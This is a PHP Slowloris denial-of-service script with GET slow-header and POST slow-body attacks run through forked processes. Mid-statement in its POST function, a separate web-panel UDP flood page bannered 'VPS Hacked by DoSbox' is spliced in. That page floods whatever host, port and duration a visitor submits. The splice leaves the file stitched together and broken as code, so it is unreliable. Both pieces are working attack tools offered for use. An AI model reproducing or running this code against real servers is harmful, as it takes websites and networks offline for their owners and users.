#! /usr/bin/env php
<?php
/* PHP Slowloris
* Adapted from the script found here: http://seclists.org/fulldisclosure/2009/Jun/207
* Contains get based attack (slow headers) and post based attack (long content length)
*
* Author: Seppe vanden Broucke
*/

function usage($argv){
    print "Usage: ./{$argv[0]} <get or post> <number of processes> <server> [host]\n";
    die();
}

function attack_get($server, $host){
    $request = "GET / HTTP/1.1\r\n";
    $request .= "Host: $host\r\n";
    $request .= "User-Agent: Mozilla/4.0 (compatible; MSIE 7.0; Windows NT5.1; .NET CLR 1.1.4322; .NET CLR 2.0.50727)\r\n";
    $request .= "Keep-Alive: 900\r\n";
    $request .= "Content-Length: " . rand(10000, 100) . "\r\n";
    $request .= "Accept: *.*\r\n";
    $request .= "X-a: " . rand(1, 10000) . "\r\n";

    $sockfd = @fsockopen($server, 80, $errno, $errstr);
    @fwrite($sockfd, $request);

    while (true){
  if (@fwrite($sockfd, "X-c:" . rand(1, 100) . "\r\n")){
  echo ".";
  sleep(15);
  }else{
  echo "\nOne get attack failed to sent...\n";
  $sockfd = @fsockopen($server, 80, $errno, $errstr);
  @fwrite($sockfd, $request);
  }
    }

}

function attack_post($server, $host){
    $request = "POST /".md5(rand())." HTTP/1.1\r\n";
    $request .= "Host: $host\r\n";
    $request .= "User-Agent: Mozilla/4.0 (compatible; MSIE 7.0; Windows NT5.1; .NET CLR 1.1.4322; .NET CLR 2.0.50727)\r\n";
    $request .= "Keep-Alive: 900\r\n";
    $request .= "Content-Length: 100\r\n";
    $request .= "Content-Type: application/x-www-form-urlencoded\r\n";
    $request .= "Accept: *.*\r\n";

    $sockfd = @<html>
<body>
<center>
<pre>
_-_-_-VPS Hacked by DoSbox-_-_-_</pre>
<?php
if(isset($_GET['host'])&&isset($_GET['time'])){
    $packets = 0;
    ignore_user_abort(TRUE);
    set_time_limit(0);

    $exec_time = $_GET['time'];

    $time = time();

    $max_time = $time+$exec_time;

    $host = $_GET['host'];

    for($i=0;$i<65000;$i++){
    $out .= 'X';
    }
    while(1){
    $packets++;
    if(time() > $max_time){
  break;
    }
            //$rand = rand(1,65535);
    $rand = $_GET['port'];
    $fp = fsockopen('udp://'.$host, $rand, $errno, $errstr, 5);
    if($fp){
  fwrite($fp, $out);
  fclose($fp);
    }
    }
  echo "<br><b>UDP Flood</b><br>Completed with " . round(($packets*65)/1024, 2) . " MB of data sent, averaging " . round(($packets*65)/1024/$time, 2) . "megabytes a second.";
    echo '<br><br>
  <form action="'.$surl.'" method=GET>
  <input type="hidden" name="act" value="phptools">
  Host: <br><input type=text name=host><br>
        Port: <br><input type=text name=port value=80><br>
  Seconds: <br><input type=text name=time value=120><br>
  <input type=submit value=Go></form>';
}else{ echo '<br><b>UDP Flood</b><br>
    <form action=? method=GET>
    <input type="hidden" name="act" value="phptools">
    Host: <br><input type=text name=host value=><br>
    Port: <br><input type=text name=port value=80><br>
    Seconds: <br><input type=text name=time value=120><br><br>
    <input type=submit value=DDoS></form>';
}
?>
</center>
</body>
</html>($server, 80, $errno, $errstr);
    @fwrite($sockfd, $request);

    while (true){
  if (@fwrite($sockfd, ".") !== FALSE){
  echo ".";
  sleep(1);
  }else{
  echo "\nOne post attack failed to sent...\n";
  $sockfd = @fsockopen($server, 80, $errno, $errstr);
  @fwrite($sockfd, $request);
  }
    }

}

function main($argc, $argv){
    $status = 1;

    if ($argc == 4){
  $argv[4] = $argv[3];
    }else if ($argc < 5){
  usage($argv);
    }

    $pids = array();

    for ($i = 0; $i < $argv[2]; $i++){
  $pid = pcntl_fork();

  if ($pid == -1){
    die("Error forking!\n");
  }else if ($pid == 0){
//child process
if ($argv[1] == 'post') {
attack_post($argv[3], $argv[4]);
}elseif ($argv[1] == 'get') {
attack_get($argv[3], $argv[4]);
}else{
die("Invalid method, use 'get' or 'post'\n");
}
    exit(0);
  }else{
    //parent process
    $pids[] = $pid;
  }
    }

    foreach ($pids as $pid){
  pcntl_waitpid($pid, $status);
    }
}

main($argc, $argv);